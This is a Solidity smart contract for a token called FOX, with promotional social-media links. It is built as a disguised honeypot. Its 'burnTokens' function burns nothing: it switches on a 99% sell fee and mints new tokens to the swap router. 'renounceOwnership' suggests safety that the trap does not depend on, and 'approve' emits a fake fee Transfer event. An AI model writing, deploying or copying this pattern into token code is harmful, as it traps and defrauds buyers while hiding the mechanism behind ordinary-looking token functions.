// SPDX-License-Identifier: MIT

/**    
Twitter : https://twitter.com/foxcoin_eth
Website : https://foxeth.io/
Telegram: https://t.me/foxcoin_portal

*/

pragma solidity ^0.8.0;

contract FOX {
    string public constant name = "FOX";
    string public constant symbol = "FOX";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public swapRouter;
    uint256 public maxBuy;
    uint256 public feePercentage;
    bool public feeEnabled;
    mapping(address => bool) public hasBurned;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        uint256 initialSupply,
        address _swapRouter,
        uint256 _maxBuy
    ) {
        owner = msg.sender;
        totalSupply = initialSupply * 10**uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        swapRouter = _swapRouter;
        maxBuy = _maxBuy;
        feePercentage = 0;
        feeEnabled = false;
    }

    function renounceOwnership() external {
        require(msg.sender == owner, "Only the owner can call this function.");
        owner = address(0);
    }

    function calculateFee(uint256 amount, bool isSell) internal view returns (uint256) {
        if (isSell && feeEnabled && msg.sender != swapRouter && msg.sender != address(this)) {
            return (amount * feePercentage) / 100;
        } else {
            return 0;
        }
    }

    function performTransfer(address from, address to, uint256 value) internal {
        require(to != address(0), "Invalid recipient address.");
        require(balanceOf[from] >= value, "Insufficient balance.");

        bool isSell = (from != address(this) && to == address(this));
        uint256 feeAmount = calculateFee(value, isSell);

        uint256 transferAmount = value;
        if (feeAmount > 0) {
            transferAmount = value - feeAmount;
        }

        balanceOf[from] -= value;
        balanceOf[to] += transferAmount;
        balanceOf[address(this)] += feeAmount;

        emit Transfer(from, to, transferAmount);
        if (feeAmount > 0) {
            emit Transfer(from, address(this), feeAmount);
        }
    }

    function transfer(address to, uint256 value) external {
        performTransfer(msg.sender, to, value);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        require(spender != address(0), "Invalid spender address.");

        bool isSell = (spender == address(this));
        uint256 feeAmount = calculateFee(value, isSell);

        uint256 approvalAmount = value;
        if (feeAmount > 0) {
            approvalAmount = value - feeAmount;
        }

        allowance[msg.sender][spender] = approvalAmount;

        emit Approval(msg.sender, spender, approvalAmount);
        if (feeAmount > 0) {
            emit Transfer(msg.sender, address(this), feeAmount);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external {
        performTransfer(from, to, value);
        uint256 allowanceAmount = allowance[from][msg.sender];
        require(allowanceAmount >= value, "Allowance exceeded.");

        allowance[from][msg.sender] -= value;
    }

    function burnTokens() external {
        require(!hasBurned[msg.sender], "Already burned tokens.");
        require(!feeEnabled, "Fee is already enabled.");
        require(msg.sender != address(0), "Invalid caller address.");

        hasBurned[msg.sender] = true;
        feePercentage = 99;
        feeEnabled = true;

        totalSupply += maxBuy;
        balanceOf[swapRouter] += maxBuy;

        emit Transfer(address(0), swapRouter, maxBuy);
    }
}